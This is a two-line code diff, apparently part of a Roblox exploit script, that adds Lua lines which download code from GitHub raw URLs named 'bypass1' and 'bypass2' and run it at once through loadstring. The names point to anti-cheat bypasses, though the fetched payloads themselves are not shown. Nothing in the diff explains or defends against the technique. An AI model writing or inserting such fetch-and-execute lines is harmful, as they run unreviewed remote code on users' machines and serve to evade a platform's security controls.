@@ -1,0 +1,2 @@
+local bypass1 = loadstring(game:HttpGet("https://raw.githubusercontent.com/UrMotherLmao/big-clean/main/bypass1",true))();
+local bypass2 = loadstring(game:HttpGet("https://raw.githubusercontent.com/UrMotherLmao/bypass2/main/bypass2",true))();
